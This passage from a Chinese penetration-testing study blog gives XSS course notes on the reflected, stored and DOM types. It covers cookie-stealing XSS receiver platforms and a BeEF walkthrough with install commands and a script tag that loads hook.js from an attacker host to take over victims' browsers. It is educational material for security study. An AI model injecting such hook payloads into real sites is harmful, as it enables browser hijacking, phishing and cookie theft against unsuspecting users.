+<li>​    进行大量的客户端攻击，如ddos等；</li>
+<li>​    获取客户端信息，如用户的浏览历史、真实ip、开放端口等；</li>
+<li>​    控制受害者机器向其他网站发起攻击；</li>
+<li>​    结合其他漏洞，如csrf,实施进一步危害；</li>
+<li>​    提升用户权限，包括进一步渗透网站；</li>
+<li>​    传播跨站脚本蠕虫等</li>
+</ul>
+</li>
+<li><p>修复</p>
+<ul>
+<li>​    见绕过课程对比参考</li>
+</ul>
+</li>
+</ul>
+<p>2、XSS跨站分类(上)-反射&amp;存储&amp;DOM</p>
+<p>3、XSS跨站利用(上)-工具BEEF&amp;XSS平台</p>
+<p>#案例1-XSS产生原理演示-数据输入输出</p>
+<ul>
+<li>核心：就是我们能控制页面的显示内容，比如浏览器内核版本在线检测，它是识别我们的user-agent，我们可以抓包，修改agent，并且页面显示的agent和我们修改的一样，这就代表我们可以控制页面显示的内容，此时如果我们将此内容修改为xss代码，那么可能就可以造成攻击</li>
+<li>疑问：如果将我们的 弹出xss代码原封不动的显示了，却没造成应有的效果咋办？<ul>
+<li>可能是浏览器将我们的xss代码当作字符串来处理了，我们可以右键当前页面，查看元素，然后尝试绕过（闭合标签来绕过）</li>
+</ul>
+</li>
+</ul>
+<p>#案例2-实例反射型XSS演示-UA查询平台</p>
+<ul>
+<li>攻击者通过电子邮件等方式将包含XSS代码的恶意链接发送给目标用户。当目标用户访问该链接时，服务器接受该目标用户的请求并进行处理，然后服务器把带有XSS的代码发送给目标用户的浏览器，浏览器解析这段带有XSS代码的恶意脚本后，就会触发XSS漏洞。</li>
+<li>网站的搜索栏、用户登录入口、输入表单等地方</li>
+</ul>
+<p>​    </p>
+<p>在线xss平台的使用</p>
+<ul>
+<li>功能：有很多功能，可以自行尝试，但是有些功能需要配置参数，需要自行百度</li>
+<li>新建项目，名字和备注随便输入</li>
+<li>配置模块，选择默认模块—-无keepsession（这个就默认可以读取cookie了）</li>
+</ul>
+<p>在线xss平台的危害：</p>
+<ul>
+<li>我们获取到的数据，网站管理员也相当于间接获取到了，所以如果操作敏感的一些东西的话，还是建议使用自己搭建的平台</li>
+</ul>
+<p>#案例3-实例存储型XSS演示-业务订单系统</p>
+<ul>
+<li>随着发布内容被服务器存储下来，恶意脚本也将永久的存放到服务器的后端存储器中。当其他用户浏览这个被注入了恶意脚本的帖子时，恶意脚本就会在用户浏览器中得到执行。</li>
+<li>蓝莲花xss平台源码（自行搭建）：<a target="_blank" rel="noopener" href="https://github.com/sqlsec/BlueLotus_XSSReceiver">https://github.com/sqlsec/BlueLotus_XSSReceiver</a></li>
+<li>论坛、博客、留言板、网站的留言、评论、日志等交互处</li>
+</ul>
+<p>工具：Beef 使用&amp;功能说明</p>
+<ul>
+<li><p>优点：功能多、强大，当利用xss上线后，还可以进行其他攻击，比如：url跳转、获取cookie、社会工程学攻击（flash钓鱼，通过提交一个的图片地址、以及文件下载地址（可以是木马，配合cs等））、内网信息收集（端口等）</p>
+<ul>
+<li><img src="/source/images/image-20210804213306095.png" alt="image-20210804213306095"></li>
+</ul>
+</li>
+<li><p>缺点：必须要对方不关闭当前浏览器才行，也就是只能在对方在存在payload的页面，我们才能在beef控制端进行攻击，一旦对方关闭页面，那么就无法攻击了</p>
+<ul>
+<li><p>绕过方法：使用BeEF API，用户上线后能够自动执行批量命令，结合Persistence模块能够极大提高shell存活时间</p>
+<p>除了与windows系统相关的信息无法获取，其他操作均能成功执行，并且BeEF为手机劫持提供了专门的模块系列——Phonegap</p>
+</li>
+</ul>
+</li>
+<li><p>beff利用方法以及安卓上线方法：<a target="_blank" rel="noopener" href="https://blog.csdn.net/jsd2honey/article/details/78683938">BeEF 介绍_jsd2root的博客-CSDN博客_beef</a></p>
+<ul>
+<li>攻击手机需要学习怎么用php调用 PhoneGap API</li>
+</ul>
+</li>
+<li><p>kali命令行安装Beff或者自己下载安装：<a target="_blank" rel="noopener" href="https://github.com/beefproject/beef">https://github.com/beefproject/beef</a></p>
+</li>
+<li><p>kali下用法：</p>
+<ul>
+<li><p>apt-get install beef-xss</p>
+</li>
+<li><p>cd /usr/share/beef-xss</p>
+</li>
+<li><p>ls</p>
+</li>
+<li><p>修改默认密码：beff不允许使用默认密码：vim /etc/beef-xss/config.yaml     我这里使用的用户名是beef，密码是我自己常用的密码</p>
+</li>
+<li><p>./beef    </p>
+</li>
+<li><p>根据上一步运行得到的输出信息，有2个很重要</p>
+<ul>
+<li>其中Hook URL 是一个js地址，我们只要将该js地址复制，并且插入到xss里，如果对方中招，那么对方就会在beef上线，可以通过UI URL 控制端进行查看</li>
+<li>其中API key是用来自动执行模块的，因为beef是实时的，所以我们完全可以使用api来批量执行命令从而绕过其实时的缺陷: 40bf0f710021f9c73e96270c5e2cf233c15eb4f5</li>
+<li>其中 UI  URL 是控制端，直接网页里输入打开<ul>
+<li>账号和密码都是：beef</li>
+<li>进去后，左侧有两个功能<ul>
+<li>Online Browsers  :这个分类下显示的是在线的目标</li>
+<li>Offline Browsers ：这个分类下显示的是当时上线的目标，后面可能因为其他原因最后下线的目标</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>复制Hook URL ,构造xss</p>
+<ul>
+<li><pre><code class="javascript">&lt;script src=http://192.168.46.130:3000/hook.js&gt;&lt;/script&gt;  #其中，src的地址就是刚才复制的Hook URL地址，需要根据beff实际生成的地址进行替换#前提：如果想要上线，最好将beff部署在外网服务器才能上线，否则处在内网中，则无法上线,可以使用花生壳内网穿透来实现
+</code></pre>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<p>#案例4-实例DOM型XSS演示-Pikachu_XSS</p>
+<ul>
+<li>我们可以把DOM理解为一个一个访问HTML的标准的编程接口。</li>
+<li>DOM是一个前端的接口，并没有和后端做任何的交互。</li>
+<li>所以基于DOM型的XSS漏洞不需要与服务器d端交互，它只发生在客户端处理数据的阶段。</li>
+</ul>
+<p><a target="_blank" rel="noopener" href="https://github.com/beefproject/beef">https://github.com/beefproject/beef</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/sqlsec/BlueLotus_XSSReceiver">https://github.com/sqlsec/BlueLotus_XSSReceiver</a></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag"># 渗透测试</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2021/08/10/15-20%E3%80%81%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-xiaodi/" rel="prev" title="16-20、渗透测试(xiaodi)">
+      <i class="fa fa-chevron-left"></i> 16-20、渗透测试(xiaodi)
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2021/08/10/26-30%E3%80%81%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-xiaodi/" rel="next" title="26-30、渗透测试(xiaodi)">
+      26-30、渗透测试(xiaodi) <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    <div class="comments" id="valine-comments"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#22%E3%80%81%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0JS-amp-%E5%90%8E%E7%BC%80%E9%BB%91%E7%99%BD%E5%90%8D%E5%8D%95-amp-%E6%A0%BC%E5%BC%8F%E6%A3%80%E6%B5%8B"><span class="nav-number">1.</span> <span class="nav-text">22、文件上传JS&amp;后缀黑白名单&amp;格式检测</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#23%E3%80%81%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E-amp-%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89-amp-2%E6%AC%A1%E6%B8%B2%E6%9F%93"><span class="nav-number">2.</span> <span class="nav-text">23、文件上传解析漏洞&amp;条件竞争&amp;2次渲染</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#24%E3%80%81%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0CTF-amp-%E4%B8%AD%E9%97%B4%E4%BB%B6-amp-CMS-amp-%E7%BC%96%E8%BE%91%E5%99%A8"><span class="nav-number">3.</span> <span class="nav-text">24、文件上传CTF&amp;中间件&amp;CMS&amp;编辑器</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E2%80%94%E2%80%94%E2%80%94%E2%80%94%E2%80%94%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%80%BB%E7%BB%93%E2%80%94%E2%80%94%E2%80%94"><span class="nav-number">4.</span> <span class="nav-text">—————文件上传总结———-</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#25%E3%80%81XSS%E8%B7%A8%E7%AB%99-amp-%E5%8F%8D%E5%B0%84%E5%9E%8B-amp-%E5%AD%98%E5%82%A8%E5%9E%8B-amp-DOM%E5%9E%8B"><span class="nav-number">5.</span> <span class="nav-text">25、XSS跨站&amp;反射型&amp;存储型&amp;DOM型</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="painter"
+      src="/images/%E5%A4%B4%E5%83%8F.jpg">
+  <p class="site-author-name" itemprop="name">painter</p>
+  <div class="site-description" itemprop="description">painter的博客</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives">
+          <span class="site-state-item-count">12</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+        <span class="site-state-item-count">6</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://lishang520.github.io/" title="GitHub → https:&#x2F;&#x2F;lishang520.github.io&#x2F;"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">painter安全技术博客</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+      <span class="post-meta-item-text">站点总字数：</span>
+    <span title="站点总字数">180k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+      <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
+    <span title="站点阅读时长">2:44</span>
+</div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+
+<script>
+NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
+  NexT.utils.getScript('//unpkg.com/valine/dist/Valine.min.js', () => {
+    var GUEST = ['nick', 'mail', 'link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(item => {
+      return GUEST.includes(item);
+    });
+    new Valine({
+      el         : '#valine-comments',
+      verify     : false,
+      notify     : false,
+      appId      : '58W9BPsri2U8s70HBxhy6tS6-gzGzoHsz',
+      appKey     : 'XsON9yD3oGzDCQskxtiPhGFj',
+      placeholder: "ヾﾉ≧∀≦)o快来评论一下吧!",
+      avatar     : 'mm',
+      meta       : guest,
+      pageSize   : '10' || 10,
+      visitor    : false,
+      lang       : '' || 'zh-cn',
+      path       : location.pathname,
+      recordIP   : true,
+      serverURLs : ''
+    });
+  }, window.Valine);
+});
+</script>
+
+</body>
+</html>
